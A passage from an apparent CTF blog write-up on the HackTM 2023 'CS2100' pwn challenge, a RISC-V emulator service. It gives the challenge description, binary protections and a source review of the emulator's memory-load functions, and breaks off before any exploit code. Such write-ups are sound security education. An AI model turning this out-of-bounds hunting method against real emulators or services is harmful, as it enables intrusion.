@@ -1,0 +1,1177 @@
+
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr" class="scroll-smooth" data-default-appearance="dark"
+  data-auto-appearance="true"><head>
+  <meta charset="utf-8" />
+  
+  <meta http-equiv="content-language" content="en" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  
+  <title>HackTM CTF Quals 2023: (CS2100) &middot; </title>
+  <meta name="title" content="HackTM CTF Quals 2023: (CS2100) &middot; " />
+  
+  <meta name="description" content="An awesome infosec blog :)" />
+  <meta name="keywords" content="VM, Exploitation, CTF, " />
+  
+  
+  <link rel="canonical" href="https://mutur4.github.io/ctfs/hacktm-ctf-2023/" />
+  
+  <link rel="alternate" type="application/rss+xml" href="/ctfs/hacktm-ctf-2023/index.xml" title="" />
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.fcb6b8f47fcf9d08dccf3e85cedee48f9dd6c0a0178e95c67a74e69f9f0588e77e10dd8d49c8f6d925fe24eb977a3c36f555f882737ae3f73d21fc10c8402b52.css"
+    integrity="sha512-/La49H/PnQjczz6Fzt7kj53WwKAXjpXGenTmn58FiOd&#43;EN2NScj22SX&#43;JOuXejw29VX4gnN64/c9IfwQyEArUg==" />
+  
+  
+  <script type="text/javascript" src="/js/appearance.min.d9c603046c077ebf0e88cb0cc75a77d795076c4f973750e71410c9e530eed5bd3b48204bb18b980da897cb9feb8371ec5cecb0056a738ddf4ab9ed2ac4b331bb.js"
+    integrity="sha512-2cYDBGwHfr8OiMsMx1p315UHbE&#43;XN1DnFBDJ5TDu1b07SCBLsYuYDaiXy5/rg3HsXOywBWpzjd9Kue0qxLMxuw=="></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.2021de190770621f45a1934d8a7bf9bae8420e3be8bd3e8b0409eeca15e2d25efd112c4c7276b4ab500db338c7afd272beea301310ad15bd98cbf94a9f3dead2.js"
+    integrity="sha512-ICHeGQdwYh9FoZNNinv5uuhCDjvovT6LBAnuyhXi0l79ESxMcna0q1ANszjHr9JyvuowExCtFb2Yy/lKnz3q0g==" data-copy="" data-copied=""></script>
+  
+  <script src="/js/zoom.min.js"></script>
+  
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+  <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:title" content="HackTM CTF Quals 2023: (CS2100)" />
+<meta property="og:description" content="An awesome infosec blog :)" />
+<meta property="og:type" content="website" />
+<meta property="og:url" content="https://mutur4.github.io/ctfs/hacktm-ctf-2023/" /><meta property="og:image" content="https://mutur4.github.io/ctfs/hacktm-ctf-2023/featured.png"/>
+
+
+  <meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://mutur4.github.io/ctfs/hacktm-ctf-2023/featured.png"/>
+<meta name="twitter:title" content="HackTM CTF Quals 2023: (CS2100)"/>
+<meta name="twitter:description" content="An awesome infosec blog :)"/>
+
+  
+  
+
+  
+  
+  <meta name="author" content="BinaryChunk" />
+  
+  
+  
+  <link href="https://github.com/mutur4" rel="me" />
+  
+  
+  <link href="https://twitter.com/binarychunk" rel="me" />
+  
+  
+  <link href="mailto:8421gilbertrobert@gmail.com" rel="me" />
+  
+  
+  <link href="https://linkedin.com/in/gilbert-robert-m" rel="me" />
+  
+  
+  <link href="https://mastodon.social/@binarychunk" rel="me" />
+  
+  
+  
+  
+
+<script src="/lib/jquery/jquery.slim.min.js" integrity=""></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+
+
+  
+  
+  <meta name="theme-color"/>
+  
+  
+</head>
+<body
+  class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32">
+  <div id="the-top" class="absolute flex self-center">
+    <a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+      href="#main-content"><span
+        class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a>
+  </div>
+  
+  
+  <div class="min-h-[148px]"></div>
+<div class="fixed inset-x-0 pl-[24px] pr-[24px]" style="z-index:100">
+  <div id="menu-blur" class="absolute opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom bg-neutral dark:bg-neutral-800"></div>
+  <div class="relative max-w-[64rem] ml-auto mr-auto">
+    <div style="padding-left:0;padding-right:0;padding-top:2px;padding-bottom:3px"
+    class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start space-x-3">
+    
+    
+    
+    <div>
+        <a href="/" class="flex">
+            <span class="sr-only"></span>
+
+            <img src="/img/ffz.png" width="50" height="50"
+                class="max-h-[5rem] max-w-[5rem] object-scale-down object-left nozoom" alt="" />
+
+        </a>
+    </div>
+    
+    <div class="flex flex-1 items-center justify-between">
+        <nav class="flex space-x-3">
+
+            <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900"></a>
+
+
+        </nav>
+        <nav class="hidden md:flex items-center space-x-5 md:ml-12">
+
+            
+            
+            
+  <a href="/"  class="flex items-center">
+    
+    <p class="text-base font-medium text-gray-500 hover:text-gray-900" title="">
+        Home
+    </p>
+</a>
+
+
+            
+            
+  <a href="/about/"  class="flex items-center">
+    
+    <p class="text-base font-medium text-gray-500 hover:text-gray-900" title="About Me">
+        About
+    </p>
+</a>
+
+
+            
+            
+  <a href="/ctfs/"  class="flex items-center">
+    
+    <p class="text-base font-medium text-gray-500 hover:text-gray-900" title="CTFs">
+        CTFs
+    </p>
+</a>
+
+
+            
+            
+  <a href="/posts/"  class="flex items-center">
+    
+    <p class="text-base font-medium text-gray-500 hover:text-gray-900" title="Blog Posts">
+        Posts
+    </p>
+</a>
+
+
+            
+            
+
+            
+
+
+            
+            <button id="search-button" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+
+            
+            
+            <div
+                class="ltr:mr-14 rtl:ml-14 cursor-pointer text-sm text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400">
+                <button id="appearance-switcher" aria-label="Dark mode switcher" type="button">
+                    <div class="flex items-center justify-center h-12 dark:hidden">
+                        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+                    </div>
+                    <div class="items-center justify-center hidden h-12 dark:flex">
+                        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+                    </div>
+                </button>
+            </div>
+            
+
+        </nav>
+        <div class="flex md:hidden items-center space-x-5 md:ml-12">
+
+            <span></span>
+
+            
+
+
+            
+            <button id="search-button-mobile" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+            
+            
+            <button id="appearance-switcher-mobile" aria-label="Dark mode switcher" type="button" style="margin-right:5px">
+                <div class="flex items-center justify-center h-12 dark:hidden">
+                    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+                </div>
+                <div class="items-center justify-center hidden h-12 dark:flex">
+                    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+                </div>
+            </button>
+            
+
+        </div>
+    </div>
+    <div class="-my-2 -mr-2 md:hidden">
+
+        <label id="menu-button" for="menu-controller" class="block">
+            <input type="checkbox" id="menu-controller" class="hidden" />
+            <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
+                
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+
+  </span>
+
+
+            </div>
+            <div id="menu-wrapper" style="padding-top:5px;"
+                class="fixed inset-0 z-30 invisible w-screen h-screen m-auto overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50">
+                <ul
+                    class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">
+
+                    <li>
+                        <span
+                            class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+</span>
+                    </li>
+
+                    
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/"  class="flex items-center">
+        
+        <p class="text-bg font-bg text-gray-500 hover:text-gray-900" title="">
+            Home
+        </p>
+    </a>
+</li>
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/about/"  class="flex items-center">
+        
+        <p class="text-bg font-bg text-gray-500 hover:text-gray-900" title="About Me">
+            About
+        </p>
+    </a>
+</li>
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/ctfs/"  class="flex items-center">
+        
+        <p class="text-bg font-bg text-gray-500 hover:text-gray-900" title="CTFs">
+            CTFs
+        </p>
+    </a>
+</li>
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/posts/"  class="flex items-center">
+        
+        <p class="text-bg font-bg text-gray-500 hover:text-gray-900" title="Blog Posts">
+            Posts
+        </p>
+    </a>
+</li>
+
+
+
+                    
+                    
+
+                </ul>
+                
+
+            </div>
+        </label>
+    </div>
+</div>
+
+
+
+
+
+  </div>
+</div>
+<script>
+  window.addEventListener('scroll', function (e) {
+    var scroll = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;
+    var background_blur = document.getElementById('menu-blur');
+    background_blur.style.opacity = (scroll / 300);
+  });
+</script>
+
+  
+  <div class="relative flex flex-col grow">
+    <main id="main-content" class="grow">
+      
+
+
+
+
+
+
+
+
+<div id="hero" class="h-[150px] md:h-[200px]"></div>
+
+
+    
+    <div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom"
+    style="background-image:url(/ctfs/hacktm-ctf-2023/featured_huc9743816a5359f3bf47a1c21ca56fd22_57976_1200x0_resize_box_3.png);">
+    
+
+
+    <div class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal">
+    </div>
+    <div
+        class="absolute inset-0 opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral-100 dark:to-neutral-800 mix-blend-normal">
+    </div>
+</div>
+
+<div id="background-blur" class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl"></div>
+<script>
+    window.addEventListener('scroll', function (e) {
+        var scroll = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;
+        var background_blur = document.getElementById('background-blur');
+        background_blur.style.opacity = (scroll / 300)
+    });
+</script>
+
+ <header>
+  
+  <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
+  
+  
+    
+  
+    
+  
+  <li class="inline hidden">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="/"
+      ></a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="inline ">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="/ctfs/"
+      >CTFs</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="inline hidden">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="/ctfs/hacktm-ctf-2023/"
+      >HackTM CTF Quals 2023: (CS2100)</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+</ol>
+
+
+  
+  <h1 class="mt-5 text-4xl font-extrabold text-neutral-900 dark:text-neutral">HackTM CTF Quals 2023: (CS2100)</h1>
+  <div class="mt-1 mb-2 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+</div>
+
+
+  </div>
+  </header>
+  <section class="mt-12 prose flex max-w-full flex-col dark:prose-invert lg:flex-row">
+    
+    <div class="order-first px-0 lg:order-last lg:max-w-xs ltr:lg:pl-8 rtl:lg:pr-8">
+      <div class="toc ltr:pl-5 rtl:pr-5 lg:sticky lg:top-10">
+        <details open class="mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#cs2100---introduction">CS2100 - Introduction</a></li>
+        <li><a href="#initial-analysis">Initial Analysis</a></li>
+        <li><a href="#source-code-review">Source Code Review</a></li>
+        <li><a href="#exploitation-strategy">Exploitation Strategy</a></li>
+        <li><a href="#weaponization">Weaponization</a>
+          <ul>
+            <li><a href="#leaking-addresses">Leaking addresses</a></li>
+          </ul>
+        </li>
+        <li><a href="#rop-attack">Rop Attack</a></li>
+        <li><a href="#conclusion">Conclusion</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#cs2100---introduction">CS2100 - Introduction</a></li>
+        <li><a href="#initial-analysis">Initial Analysis</a></li>
+        <li><a href="#source-code-review">Source Code Review</a></li>
+        <li><a href="#exploitation-strategy">Exploitation Strategy</a></li>
+        <li><a href="#weaponization">Weaponization</a>
+          <ul>
+            <li><a href="#leaking-addresses">Leaking addresses</a></li>
+          </ul>
+        </li>
+        <li><a href="#rop-attack">Rop Attack</a></li>
+        <li><a href="#conclusion">Conclusion</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+ 
+<script>
+  (function () {
+    var $toc = $('#TableOfContents');
+    if ($toc.length > 0) {
+      var $window = $(window);
+
+      function onScroll() {
+        var currentScroll = $window.scrollTop();
+        var h = $('.anchor');
+        var id = "";
+        h.each(function (i, e) {
+          e = $(e);
+          if (e.offset().top - $(window).height()/3 <= currentScroll) {
+            id = e.attr('id');
+          }
+        });
+        var active = $toc.find('a.active');      
+        if (active.length == 1 && active.eq(0).attr('href') == '#' + id) return true;
+
+        active.each(function (i, e) {
+           
+            $(e).removeClass('active').siblings('ul').hide();
+          
+        });
+        $toc.find('a[href="#' + id + '"]').addClass('active')
+        $toc.find('a[href="#' + id + '"]').parentsUntil('#TableOfContents').each(function (i, e) {
+          $(e).children('a').parents('ul').show();          
+        });
+      }
+
+      $window.on('scroll', onScroll);
+      $(document).ready(function () {
+         
+          $toc.find('a').parent('li').find('ul').hide();
+        
+        onScroll();
+      });
+    }
+  })();
+</script>
+
+      </div>
+    </div>
+    
+    <div class="min-w-0 min-h-0 max-w-prose">
+      <div id="cs2100---introduction" class="anchor"></div>
+<h3 class="relative group">CS2100 - Introduction 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#cs2100---introduction" aria-label="Anchor">#</a></span>        
+    
+</h3>
+<p>This was an interesting CTF that took place between 18th and 19th Feb, 2023. I actually solved the challenge way after the CTF was over, therefore (tl;dr) the following are the steps that I would have taken during the CTF to solve the challenge.</p>
+<p>The following was the description of the provided challenge:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">To</span> <span class="nx">all</span> <span class="nx">my</span> <span class="nx">CS2100</span> <span class="nx">Computer</span> <span class="nx">Organisation</span> <span class="nx">students</span><span class="p">,</span> <span class="nx">I</span> <span class="nx">hope</span> <span class="nx">you</span><span class="s1">&#39;ve enjoyed the lectures thus far on RISC-V assembly.
+</span></span></span><span class="line"><span class="cl"><span class="s1"> 
+</span></span></span><span class="line"><span class="cl"><span class="s1">I have set-up an online service for you to test your own RISC-V code!
+</span></span></span><span class="line"><span class="cl"><span class="s1">Simply connect to the service through tcp:
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">nc 34.141.16.87 10000
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">Credit: Thanks to `@fmash16` for his emulator! I didn&#39;</span><span class="nx">t</span> <span class="nx">even</span> <span class="nx">have</span> <span class="nx">to</span> <span class="nx">compile</span> <span class="nx">the</span> <span class="nx">emulator</span> <span class="nx">binary</span> <span class="nx">myself</span> <span class="o">:</span><span class="nx">O</span> <span class="nx">https</span><span class="o">:</span><span class="c1">//github.com/fmash16/riscv_emulator/blob/main/main
+</span></span></span></code></pre></div><div id="initial-analysis" class="anchor"></div>
+<h3 class="relative group">Initial Analysis 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#initial-analysis" aria-label="Anchor">#</a></span>        
+    
+</h3>
+<p>The challenge provided a <em>zip</em> file for download that had the challenge files. These files can be downloaded from here <a href="https://drive.google.com/file/d/1fvZ0rfXOPmH_HqpG0tDVaPl45_bKmpGC/view?usp=sharing"   target="_blank">
+    attachment.zip</a></p>
+<p>The challenge binary file provided was called <code>main</code> and checking the protections enabled using the <code>checksec</code> command, all exploit mitgations protections are enabled.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">checksec ./main
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/kali/Desktop/CTFs/23/HackTM/Pwn/CS2100/chal/main&#39;</span>
+</span></span><span class="line"><span class="cl">    Arch:     amd64-64-little
+</span></span><span class="line"><span class="cl">    RELRO:    Partial RELRO
+</span></span><span class="line"><span class="cl">    Stack:    Canary found
+</span></span><span class="line"><span class="cl">    NX:       NX enabled
+</span></span><span class="line"><span class="cl">    PIE:      PIE enabled
+</span></span></code></pre></div><p>From the description and from the provided <a href="https://github.com/fmash16/riscv_emulator"   target="_blank">
+    repo</a> this challenge seems to be a <strong>VM</strong> that is used to emulate <em>RISC-V</em> instructions. It also turns out that the provided challenge binary file is a compiled version of the repo.</p>
+<p>For a quick description, <strong>RISC-V</strong> is an ISA that uses a <em>load</em> and <em>store</em> architecture and the base instructions set has a fixed length of 32-bit aligned instructions, the different registers and architecture design can be found <a href="https://itnext.io/risc-v-instruction-set-cheatsheet-70961b4bbe8"   target="_blank">
+    here</a>.</p>
+<p>Since this was a <strong>VM</strong> based challenge, I decide to look for <em>Out-of-Bounds</em> (OOB) vulnerabilities, this was just a hunch coming from earlier writeups that I read based on challenges that had the same bug.</p>
+<div id="source-code-review" class="anchor"></div>
+<h3 class="relative group">Source Code Review 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#source-code-review" aria-label="Anchor">#</a></span>        
+    
+</h3>
+<p>From the github repo provided, we can access the source code, this really reduced the hustle of decompling/reversing the binary. As briefly mentioned above, <em>RISC_V</em> applies the load and store architecture. So the key to finding the vulnerablity is to look at instructions that implement these <em>loads</em> and <em>stores</em>.</p>
+<p>You can clone the repo to easily review the source-code from you&rsquo;re favourite editor. Most of the interesting code is at the <code>src/cpu.c</code>. Skimming through the code, a <code>CPU</code> object with <em>registers</em> and a <em>program counter</em> is initialized.</p>
+<p>From here, there are interesting functions like <em>exec_LN</em> where (N) is used to specifty the size that could either be a Byte, Half Word, Word or a Double. These functions perform some sort of <em>store</em> since they call the <em>cpu_load</em> function.</p>
+<p>For example the <em>exec_LD</em> function is as follows:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="c1">// This function queries some registers and calls cpu_load
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">exec_LB</span><span class="p">(</span><span class="n">CPU</span><span class="o">*</span> <span class="n">cpu</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">inst</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// load 1 byte to rd from address in rs1
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">uint64_t</span> <span class="n">imm</span> <span class="o">=</span> <span class="n">imm_I</span><span class="p">(</span><span class="n">inst</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">cpu</span><span class="o">-&gt;</span><span class="n">regs</span><span class="p">[</span><span class="n">rs1</span><span class="p">(</span><span class="n">inst</span><span class="p">)]</span> <span class="o">+</span> <span class="p">(</span><span class="kt">int64_t</span><span class="p">)</span> <span class="n">imm</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cpu</span><span class="o">-&gt;</span><span class="n">regs</span><span class="p">[</span><span class="n">rd</span><span class="p">(</span><span class="n">inst</span><span class="p">)]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int64_t</span><span class="p">)(</span><span class="kt">int8_t</span><span class="p">)</span> <span class="n">cpu_load</span><span class="p">(</span><span class="n">cpu</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">print_op</span><span class="p">(</span><span class="s">&#34;lb</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// CPU load further calls bus_load
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">uint64_t</span> <span class="nf">cpu_load</span><span class="p">(</span><span class="n">CPU</span><span class="o">*</span> <span class="n">cpu</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">bus_load</span><span class="p">(</span><span class="o">&amp;</span><span class="p">(</span><span class="n">cpu</span><span class="o">-&gt;</span><span class="n">bus</span><span class="p">),</span> <span class="n">addr</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//bus load calls dram_load
